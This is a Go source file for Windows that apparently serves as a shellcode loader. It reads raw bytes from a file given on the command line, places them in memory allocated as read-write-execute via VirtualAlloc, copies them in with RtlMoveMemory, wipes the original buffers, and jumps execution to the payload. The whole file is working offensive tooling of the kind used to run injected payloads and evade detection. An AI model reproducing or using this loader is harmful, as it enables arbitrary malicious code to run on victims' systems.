package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
	//"net/http"
	"log"
	//"os/exec"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func main() {
	var charcode []byte
	fileObj, err := os.Open(os.Args[1]);
	bodyBytes, err := ioutil.ReadAll(fileObj)
	if err != nil {
		log.Fatal(err)
	}
	charcode = bodyBytes
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkErr(err)

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	for j := 0; j < len(bodyBytes); j++ {
		bodyBytes[j] = 0
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
